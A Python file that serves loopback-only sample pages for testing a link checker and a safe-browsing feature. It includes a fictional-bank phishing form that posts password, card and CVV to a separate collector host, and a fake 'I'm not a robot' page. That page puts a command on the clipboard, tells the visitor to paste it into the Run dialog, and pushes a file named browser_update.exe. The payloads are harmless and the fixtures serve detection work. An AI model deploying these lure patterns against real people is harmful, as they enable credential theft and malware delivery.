"""Sample links for the link checker and Safe Browse. Loopback only, fictional brands, no malware.

Each address plays one role, so a sample's redirects, form posts and third
parties cross real "sites" (different origins), as on the internet:

  127.0.0.49  Harbour City Times: an ordinary article (expected: low risk)
  127.0.0.50  an ad-click redirector that adds click IDs
  127.0.0.51  Sunny Deals: the advertiser's landing page (expected: be careful)
  127.0.0.52  127.0.0.53  127.0.0.54   pixel, analytics and tag servers used by Sunny Deals
  127.0.0.55  a link shortener, as in a scam text message
  127.0.0.56  Koala Bank (fictional): a fake sign-in page (expected: dangerous)
  127.0.0.57  where the fake bank's form sends what you type (discarded, never stored)
  127.0.0.58  a fake "I'm not a robot" check that writes a harmless command to
              the clipboard and pushes a harmless file named like a program (expected: dangerous)

The sandbox may open these only with SANDBOX_ALLOW_HOSTS=127.0.0.48/28 (the Pi
installer sets it when the hotspot is enabled). On the Pi the firewall allows
the service account to reach exactly this range on this port.

  python -m examples.sample_links --port 8030
"""
from __future__ import annotations

import argparse
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, quote, urlsplit

ROLES = (("127.0.0.49", "news"), ("127.0.0.50", "ads"), ("127.0.0.51", "shop"), ("127.0.0.52", "pixel"),
         ("127.0.0.53", "analytics"), ("127.0.0.54", "tags"), ("127.0.0.55", "short"), ("127.0.0.56", "bank"),
         ("127.0.0.57", "collector"), ("127.0.0.58", "captcha"))
NETWORK = "127.0.0.48/28"
CLIPBOARD_TEXT = "echo DataExodus sample: a real fake-CAPTCHA page would paste a malware command here"
FOOTER = ("<footer>DataExodus sample page for the link checker. Fictional brand, local lab only: "
          "nothing you type is stored.</footer>")
STYLE = ("<style>body{font:16px/1.5 system-ui;margin:0;color:#1d2a33;background:#f6f7f9}main{max-width:640px;"
         "margin:0 auto;padding:18px}footer{font-size:12px;color:#6b7781;padding:18px;border-top:1px solid #dde2e6}"
         "button,.btn{font:inherit;border:0;border-radius:10px;padding:12px 18px;background:#e0542b;color:#fff;"
         "display:inline-block;text-decoration:none}input{font:inherit;width:100%;box-sizing:border-box;padding:10px;"
         "margin:4px 0 12px;border:1px solid #b9c2c9;border-radius:8px}label{font-weight:600;font-size:14px}</style>")
GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,"
       b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")


def page(title: str, body: str) -> bytes:
    return (f"<!doctype html><html lang=en><meta charset=utf-8><meta name=viewport content='width=device-width, "
            f"initial-scale=1'><title>{title}</title>{STYLE}<main>{body}</main>{FOOTER}</html>").encode()


def samples(origin: dict[str, str] | None = None, port: int = 8030) -> list[dict]:
    """The four sample links, for the portal's "Try a sample" list."""
    o = origin or {role: f"http://{host}:{port}" for host, role in ROLES}
    deal = o["shop"] + "/deal/headphones"
    return [
        {"id": "news", "title": "Local news article", "expect": "low",
         "what": "An ordinary article from one site, with no trackers.",
         "url": o["news"] + "/2026/10/library-late-opening"},
        {"id": "deal", "title": "Sponsored deal (an ad click)", "expect": "caution",
         "what": "An ad that bounces through an ad network, adds click IDs, loads trackers and asks for notifications.",
         "url": o["ads"] + "/aclk?ad=spring-sale&adurl=" + quote(deal, safe="")},
        {"id": "bank", "title": "\"Verify your account\" text message", "expect": "danger",
         "what": "A short link to a fake bank sign-in page that sends your password and card to another site.",
         "url": o["short"] + "/s/kb7Q"},
        {"id": "captcha", "title": "Fake \"I'm not a robot\" check", "expect": "danger",
         "what": "A fake CAPTCHA that puts a command on your clipboard and pushes a program download.",
         "url": o["captcha"] + "/verify?session=4821"},
    ]


class SampleLinks:
    def __init__(self, port=8030):
        self.port = port
        self.servers = []
        self.origin: dict[str, str] = {}
        self.form_posts = 0  # count only: the fake bank's form contents are discarded
        self.lock = threading.Lock()

    def samples(self) -> list[dict]:
        return samples(self.origin)

    def __enter__(self):
        lab = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *_):
                pass

            def send(self, body: bytes, mime="text/html; charset=utf-8", status=200, headers=()):
                self.send_response(status)
                self.send_header("Content-Type", mime)
                self.send_header("Cache-Control", "no-store")
                for key, value in headers:
                    self.send_header(key, value)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def redirect(self, location: str):
                self.send(b"", "text/plain", 302, [("Location", location)])

            def do_GET(self):
                route = urlsplit(self.path)
                query = parse_qs(route.query)
                role, o = self.server.role, lab.origin
                if role == "news" and route.path.startswith("/2026/"):
                    self.send(page("Library to open late on Thursdays | Harbour City Times", (
                        "<h1>Library to open late on Thursdays</h1><p><b>Harbour City Times</b> · Local news</p>"
                        "<img alt='' width=320 height=120 src='/banner.svg'>"
                        "<p>The central library will stay open until 9 pm every Thursday from next month, "
                        "the council said. Study rooms can be booked at the front desk.</p>"
                        "<p>Residents asked for later hours in a survey earlier this year.</p>")))
                elif role == "news" and route.path == "/banner.svg":
                    self.send(b"<svg xmlns='http://www.w3.org/2000/svg' width='320' height='120'><rect width='320' "
                              b"height='120' fill='#c9dde8'/><text x='20' y='70' font-size='24'>Harbour City</text></svg>",
                              "image/svg+xml")
                elif role == "ads" and route.path == "/aclk":
                    target = query.get("adurl", [""])[0]
                    if not target.startswith(o["shop"] + "/"):
                        self.send(b"unknown ad", "text/plain", 404)
                        return
                    joiner = "&" if "?" in target else "?"
                    self.redirect(target + joiner + "gclid=DX-SAMPLE-7f3a9c&utm_source=sample_ads&utm_campaign=spring")
                elif role == "shop" and route.path.startswith("/deal/"):
                    self.send(page("Noise-cancelling headphones 70% off | Sunny Deals", (
                        f"<script src='{o['tags']}/gtm.js'></script><script src='{o['analytics']}/collect.js'></script>"
                        "<h1>Sunny Deals</h1><h2>Noise-cancelling headphones: 70% off</h2>"
                        "<p>Only 3 left at this price. Free shipping today.</p><a class=btn href='#'>Add to cart</a>"
                        f"<img alt='' width=1 height=1 src='{o['pixel']}/p.gif?ev=landing'>"
                        "<script>setTimeout(()=>{try{Notification.requestPermission()}catch(e){}},300)</script>")))
                elif role in ("pixel", "analytics", "tags"):
                    if route.path.endswith(".gif"):
                        self.send(GIF, "image/gif")
                    else:
                        beacon = f"new Image().src='{o['pixel']}/p.gif?ev={role}';"
                        self.send(beacon.encode(), "application/javascript")
                elif role == "short" and route.path.startswith("/s/"):
                    self.redirect(o["bank"] + "/koala-bank/verify?ref=sms")
                elif role == "bank" and route.path == "/koala-bank/verify":
                    self.send(page("Koala Bank - Verify your account", (
                        "<h1>Koala Bank</h1><p style='background:#fde8e1;padding:10px;border-radius:8px'>"
                        "<b>Unusual activity detected.</b> Your account will be suspended within 24 hours unless you "
                        "verify your account.</p>"
                        f"<form method=post action='{o['collector']}/collect'>"
                        "<label for=cn>Customer number</label><input id=cn name=customer autocomplete=username>"
                        "<label for=pw>Password</label><input id=pw name=password type=password autocomplete=current-password>"
                        "<label for=cc>Card number</label><input id=cc name=cardnumber autocomplete=cc-number inputmode=numeric>"
                        "<label for=ex>Expiry</label><input id=ex name=expiry autocomplete=cc-exp>"
                        "<label for=cv>CVV</label><input id=cv name=cvv autocomplete=cc-csc inputmode=numeric>"
                        "<button>Verify now</button></form>")))
                elif role == "captcha" and route.path == "/verify":
                    self.send(page("Just a moment...", (
                        "<h1>Checking your browser</h1><p>Verify you are human to continue.</p>"
                        "<button id=robot>&#9744; I'm not a robot</button><div id=steps hidden>"
                        "<h2>Verification steps</h2><ol><li>Press Win + R</li><li>Press Ctrl + V</li>"
                        "<li>Press Enter</li></ol></div><script>"
                        f"const cmd={CLIPBOARD_TEXT!r};"
                        "const copy=()=>{try{navigator.clipboard.writeText(cmd).catch(()=>{})}catch(e){}};"
                        "copy();document.getElementById('robot').onclick=()=>{copy();"
                        "document.getElementById('steps').hidden=false;};"
                        "setTimeout(()=>{const a=document.createElement('a');a.href='/download/browser_update.exe';"
                        "a.download='browser_update.exe';document.body.append(a);a.click();},800);</script>")))
                elif role == "captcha" and route.path == "/download/browser_update.exe":
                    self.send(b"Harmless DataExodus sample file. It is not a program.", "application/octet-stream",
                              headers=[("Content-Disposition", "attachment; filename=browser_update.exe")])
                else:
                    self.send(b"not found", "text/plain", 404)

            def do_POST(self):
                if self.server.role != "collector" or urlsplit(self.path).path != "/collect":
                    self.send(b"not found", "text/plain", 404)
                    return
                try:
                    size = min(int(self.headers.get("Content-Length", "0")), 65536)
                except ValueError:
                    size = 0
                self.rfile.read(size)  # read and discarded: never stored or logged
                with lab.lock:
                    lab.form_posts += 1
                self.send(page("Received", (
                    "<h1>The form was sent to another site</h1><p>This is where a real phishing site would now "
                    "hold your password and card number. This sample discarded what was sent.</p>")))

        try:
            for host, role in ROLES:
                server = ThreadingHTTPServer((host, self.port), Handler)
                server.role = role
                self.servers.append(server)
                self.origin[role] = f"http://{host}:{server.server_port}"
            for server in self.servers:
                threading.Thread(target=server.serve_forever, kwargs={"poll_interval": 0.2}, daemon=True).start()
            return self
        except Exception:
            for server in self.servers:
                server.server_close()
            raise

    def __exit__(self, *_):
        for server in self.servers:
            server.shutdown()
            server.server_close()


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--port", type=int, default=8030)
    args = parser.parse_args()
    with SampleLinks(args.port) as lab:
        for sample in lab.samples():
            print(f"{sample['id']:8} {sample['url']}", flush=True)
        print(f"The sandbox opens these only with SANDBOX_ALLOW_HOSTS={NETWORK}. Stop with Ctrl+C", flush=True)
        try:
            threading.Event().wait()
        except KeyboardInterrupt:
            pass


if __name__ == "__main__":
    main()
